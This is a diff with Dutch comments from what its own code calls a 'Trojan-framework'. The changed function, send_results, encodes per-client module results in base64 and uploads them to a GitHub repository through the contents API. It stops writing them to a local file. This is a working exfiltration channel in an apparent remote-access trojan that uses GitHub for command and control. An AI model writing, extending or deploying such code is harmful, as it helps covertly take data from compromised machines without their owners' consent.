@@ -114,36 +114,45 @@ def execute_module(module_path):
         
         
 
+
 def send_results(data):
-    # Pad naar het resultaatbestand
+    # Pad naar het bestand op GitHub
     file_path = f"data/{CLIENT_ID}.json"
+    url = f"{GITHUB_REPO}/contents/{file_path}"
     
-    # Controleer of het bestand al bestaat
-    if os.path.exists(file_path):
-        # Als het bestand al bestaat, lees de bestaande inhoud
-        with open(file_path, 'r') as file:
-            try:
-                existing_data = json.load(file)
-                if not isinstance(existing_data, list):  # Als de inhoud geen lijst is, maak een lege lijst
-                    existing_data = []
-            except json.JSONDecodeError:
-                # Als het bestand niet goed gelezen kan worden, maak een lege lijst
-                existing_data = []
-    else:
-        # Als het bestand nog niet bestaat, maak een nieuwe lijst
-        existing_data = []
+    # Haal de huidige inhoud op van het bestand, indien het al bestaat
+    try:
+        response = requests.get(url, headers=HEADERS)
+        if response.status_code == 200:
+            # Het bestand bestaat al, krijg de sha voor update
+            sha = response.json()["sha"]
+        else:
+            # Het bestand bestaat nog niet, geen sha nodig
+            sha = None
+    except requests.exceptions.RequestException as e:
+        print(f"Fout bij ophalen van bestaande data: {e}")
+        sha = None  # Indien er een fout is, proberen we het bestand als nieuw te behandelen
     
-    # Voeg de nieuwe resultaten toe aan de bestaande data
-    if isinstance(data, dict):
-        existing_data.append(data)
-    else:
-        print("Error: De verwachte data is geen dictionary.")
+    # Data voorbereiden (base64 encoding)
+    try:
+        content = json.dumps(data)  # Zet de data om naar een JSON-string
+        encoded_content = base64.b64encode(content.encode("utf-8")).decode("utf-8")  # Base64 encoderen
 
-    # Schrijf de bijgewerkte data naar het bestand
-    with open(file_path, 'w') as file:
-        json.dump(existing_data, file, indent=4)
+        # Payload voorbereiden voor GitHub API
+        payload = {
+            "message": "Update module results",  # Commit message
+            "content": encoded_content,  # Geëncodeerde content
+            "sha": sha  # SHA van het bestand als we het willen bijwerken
+        }
 
-    print("Resultaten succesvol geüpload.")
+        # Upload de data naar GitHub
+        response = requests.put(url, headers=HEADERS, json=payload)
+        if response.status_code in [200, 201]:
+            print("Resultaten succesvol geüpload naar GitHub.")
+        else:
+            print(f"Fout bij uploaden naar GitHub: {response.status_code}")
+    except Exception as e:
+        print(f"Fout bij uploaden van resultaten naar GitHub: {e}")
 
 def main():
     # Hoofdfunctie van het Trojan-framework
